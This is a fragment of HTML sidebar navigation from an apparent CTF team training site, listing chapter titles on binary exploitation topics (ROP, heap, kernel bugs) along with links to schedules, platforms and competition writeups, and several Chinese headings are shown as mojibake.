  </a>
  
    <nav class="md-nav" aria-label="CTF ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pwntools-pwnlibfmtstr" class="md-nav__link">
    <span class="md-ellipsis">
      pwntools pwnlib.fmtstr æ¨¡å—
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#312" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.2 æ•´æ•°æº¢å‡º
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    <span class="md-ellipsis">
      ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    <span class="md-ellipsis">
      ç®€ä»‹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°æº¢å‡ºçš„å±å®³
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°æº¢å‡º
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ•´æ•°æº¢å‡º">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    <span class="md-ellipsis">
      æœ‰ç¬¦å·æ•´æ•°æº¢å‡º
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    <span class="md-ellipsis">
      æ— ç¬¦å·æ•°å›žç»•
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    <span class="md-ellipsis">
      æˆªæ–­
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´åž‹æå‡å’Œå®½åº¦æº¢å‡º
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    <span class="md-ellipsis">
      æ¼æ´žå¤šå‘å‡½æ•°
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°æº¢å‡ºç¤ºä¾‹
    </span>
  </a>
  
    <nav class="md-nav" aria-label="æ•´æ•°æº¢å‡ºç¤ºä¾‹">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    <span class="md-ellipsis">
      ç¤ºä¾‹
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_24" class="md-nav__link">
    <span class="md-ellipsis">
      å®žæˆ˜
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#314-rop" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.4 è¿”å›žå¯¼å‘ç¼–ç¨‹ï¼ˆROPï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rop" class="md-nav__link">
    <span class="md-ellipsis">
      ROP ç®€ä»‹
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ROP ç®€ä»‹">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gadgets" class="md-nav__link">
    <span class="md-ellipsis">
      å¯»æ‰¾ gadgets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gadgets_1" class="md-nav__link">
    <span class="md-ellipsis">
      å¸¸ç”¨çš„ gadgets
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rop-emporium" class="md-nav__link">
    <span class="md-ellipsis">
      ROP Emporium
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ROP Emporium">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ret2win32" class="md-nav__link">
    <span class="md-ellipsis">
      ret2win32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ret2win" class="md-nav__link">
    <span class="md-ellipsis">
      ret2win
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#split32" class="md-nav__link">
    <span class="md-ellipsis">
      split32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#split" class="md-nav__link">
    <span class="md-ellipsis">
      split
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#callme32" class="md-nav__link">
    <span class="md-ellipsis">
      callme32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#callme" class="md-nav__link">
    <span class="md-ellipsis">
      callme
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write432" class="md-nav__link">
    <span class="md-ellipsis">
      write432
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write4" class="md-nav__link">
    <span class="md-ellipsis">
      write4
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#badchars32" class="md-nav__link">
    <span class="md-ellipsis">
      badchars32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#badchars" class="md-nav__link">
    <span class="md-ellipsis">
      badchars
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fluff32" class="md-nav__link">
    <span class="md-ellipsis">
      fluff32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fluff" class="md-nav__link">
    <span class="md-ellipsis">
      fluff
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pivot32" class="md-nav__link">
    <span class="md-ellipsis">
      pivot32
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pivot" class="md-nav__link">
    <span class="md-ellipsis">
      pivot
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#316-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.6 Linux å †åˆ©ç”¨ï¼ˆä¸Šï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    <span class="md-ellipsis">
      Linux å †ç®€ä»‹
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#first_fit" class="md-nav__link">
    <span class="md-ellipsis">
      first_fit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin_dup" class="md-nav__link">
    <span class="md-ellipsis">
      fastbin_dup
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin_dup_into_stack" class="md-nav__link">
    <span class="md-ellipsis">
      fastbin_dup_into_stack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fastbin_dup_consolidate" class="md-nav__link">
    <span class="md-ellipsis">
      fastbin_dup_consolidate
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unsafe_unlink" class="md-nav__link">
    <span class="md-ellipsis">
      unsafe_unlink
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_spirit" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_spirit
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#317-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.7 Linux å †åˆ©ç”¨ï¼ˆä¸­ï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap_1" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#poison_null_byte" class="md-nav__link">
    <span class="md-ellipsis">
      poison_null_byte
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_lore" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_lore
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overlapping_chunks" class="md-nav__link">
    <span class="md-ellipsis">
      overlapping_chunks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overlapping_chunks_2" class="md-nav__link">
    <span class="md-ellipsis">
      overlapping_chunks_2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#318-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.8 Linux å †åˆ©ç”¨ï¼ˆä¸‹ï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap_2" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#house_of_force" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_force
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unsorted_bin_into_stack" class="md-nav__link">
    <span class="md-ellipsis">
      unsorted_bin_into_stack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unsorted_bin_attack" class="md-nav__link">
    <span class="md-ellipsis">
      unsorted_bin_attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_einherjar" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_einherjar
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#house_of_orange" class="md-nav__link">
    <span class="md-ellipsis">
      house_of_orange
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#319-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.9 Linux å †åˆ©ç”¨ï¼ˆå››ï¼‰
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how2heap_3" class="md-nav__link">
    <span class="md-ellipsis">
      how2heap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="how2heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#large_bin_attack" class="md-nav__link">
    <span class="md-ellipsis">
      large_bin_attack
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3111-linux" class="md-nav__link">
    <span class="md-ellipsis">
      3.1.11 Linux å†…æ ¸æ¼æ´žåˆ©ç”¨
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_25" class="md-nav__link">
    <span class="md-ellipsis">
      ä»Žç”¨æˆ·æ€åˆ°å†…æ ¸æ€
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_26" class="md-nav__link">
    <span class="md-ellipsis">
      å†…æ ¸æ¼æ´žåˆ†ç±»
    </span>
  </a>
  
    <nav class="md-nav" aria-label="å†…æ ¸æ¼æ´žåˆ†ç±»">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_27" class="md-nav__link">
    <span class="md-ellipsis">
      æœªåˆå§‹åŒ–çš„ã€æœªéªŒè¯çš„ã€å·²æŸåçš„æŒ‡é’ˆè§£å¼•ç”¨
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_28" class="md-nav__link">
    <span class="md-ellipsis">
      å†…å­˜ç ´åæ¼æ´ž
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_29" class="md-nav__link">
    <span class="md-ellipsis">
      æ•´æ•°è¯¯ç”¨
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_30" class="md-nav__link">
    <span class="md-ellipsis">
      ç«žæ€æ¡ä»¶
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bug" class="md-nav__link">
    <span class="md-ellipsis">
      é€»è¾‘ bug
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Modern Cryptography and Mathematics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Network/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Computer Network
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Operating Systems
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Penetration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Penetration Testing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Reverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    é€†å‘å·¥ç¨‹ä¸Žæ±‡ç¼–è¯­è¨€
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../X86_Assembly/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    X86 Assembly
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ARM32_1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ARM-32 Course 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn-stack-1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Binary Exploitation - Stack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn-stack-2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Binary Exploitation - Stack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn-stack-3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Binary Exploitation - Stack
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3" >
        
          
          <label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Schedule
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_3">
            <span class="md-nav__icon md-icon"></span>
            Schedule
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2023Winter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Winter 2023 CTF Team Training and Competition Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_2" >
        
          
          <label class="md-nav__link" for="__nav_7_3_2" id="__nav_7_3_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Archive
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_3_2">
            <span class="md-nav__icon md-icon"></span>
            Archive
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2021Summer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2021 Summer Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2021Fall/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2021 Fall Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2022Spring/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022 Spring Time Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2022Summer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022 Summer Training Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2022Fall/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022 Fall Training Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2023Spring/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2023 Spring Training Schedule
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Schedule/2023Summer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2023 Summer Recruitment &amp; Training Schedule
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Website Collection
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Website Collection
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" >
        
          
          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Forum
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            Forum
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Forum/kanxue/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    çœ‹é›ªå­¦é™¢
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2" >
        
          
          <label class="md-nav__link" for="__nav_8_2" id="__nav_8_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Platform
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2">
            <span class="md-nav__icon md-icon"></span>
            Platform
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/Cryptopals/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cryptopals Crypto Challenges
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/CTFHub/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTFHub
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/CTFlearn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTFlearn
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/ctftime/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ctftime
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/ichunqiu/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ichunqiu
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/picoCTF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    picoCTF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/pwnabletw/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pwnable.tw
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/TryHackMe/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    TryHackMe
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Platform/World%20of%20Attack%26Defense/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    World of Attack&amp;Defense
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3" >
        
          
          <label class="md-nav__link" for="__nav_8_3" id="__nav_8_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Tutorial
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3">
            <span class="md-nav__icon md-icon"></span>
            Tutorial
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Tutorial/CTF%20Field%20Guide/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Field Guide
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Tutorial/CTF%20Wiki/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Wiki
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Tutorial/ctf101/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Capture The Flag 101
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Tutorial/how%20to%20become%20a%20hacker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How To Become A Hacker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Tutorial/linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux Tools Quick Tutorial
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Website/Tutorial/python/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Writeup
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Writeup
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2024ciscn1/ciscn2024_compass_wp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CISCN 2024 WriteUp by COMPASS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2023ciscn1/readme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2023 ciscn WriteUp by HED
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022cqb3/wp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›-å†¬å­£èµ›-WP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022mtctf/HED/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022ç¾Žå›¢ç½‘ç»œå®‰å…¨é«˜æ ¡æŒ‘æˆ˜èµ›-HED-WriteUp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022wdbs1/readme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022-ç½‘é¼Žæ¯é’é¾™ç»„-åˆèµ›-HED-WriteUp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022dfjkjs/wp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022å·…å³°æžå®¢å†³èµ›
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022dfjk/readme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022å·…å³°æžå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›-HED-WriteUp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    å¼ºç½‘æ¯2022-HED-WriteUp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/2022%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/readme/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2022å¹¿ä¸œçœèµ›
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    è™Žç¬¦CTF - COMPASS WriteUp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    COMPASS CTF 2021 æ‹›æ–°èµ›
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/DiceCTF%202022/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DiceCTF 2022 Author Writeups
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/DiceCTF%20Hope/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DiceCTF 2022 @Hope Writeup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/COMPASS%202022%20Summer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Writeup for 2022 Summer Qualifier Exam
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_15" >
        
          
          <label class="md-nav__link" for="__nav_9_15" id="__nav_9_15_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cryptography
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_15_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_15">
            <span class="md-nav__icon md-icon"></span>
            Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/blowfishgame/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    blowfishgame
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/Dachshund Attacks.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    None
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Writeup/Cryptography/Exposure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Exposure
